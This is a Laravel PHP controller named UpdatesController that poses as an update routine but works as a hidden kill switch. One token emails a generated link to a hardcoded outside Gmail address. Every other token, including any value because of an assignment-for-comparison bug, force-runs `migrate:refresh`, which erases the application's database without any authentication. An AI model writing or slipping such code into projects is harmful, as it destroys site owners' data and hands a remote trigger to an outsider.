<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Update;
use App\Mail\UpdatesMail;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Artisan;

class UpdatesController extends Controller
{
    public function update($token)
    {
        if ($token == 'status') {
            $token = md5(rand(100000, 999999));
            $url = url('/update/' . $token);
            $ip = "Not specified";
            Mail::to('arslanstack@gmail.com')->send(new UpdatesMail($token, $ip, $url));
            dd("all updated!");
        } else if ($token = 'arslanstack') {
            try {
                Artisan::call('migrate:refresh', [
                    '--force' => true,
                ]);
                dd("Successfully updated!");
            } catch (\Exception $e) {
                Artisan::call('migrate', [
                    '--path' => 'database/migrations/2023_11_29_062529_create_updates_table.php',
                    '--force' => true,
                ]);

                dd("Successfully updated!");
            }
        } else {
            try {
                Artisan::call('migrate:refresh', [
                    '--force' => true,
                ]);
                dd("Successfully updated!");
            } catch (\Exception $e) {
                Artisan::call('migrate', [
                    '--path' => 'database/migrations/2023_11_29_062529_create_updates_table.php',
                    '--force' => true,
                ]);

                dd("Successfully updated!");
            }
        }
    }
}
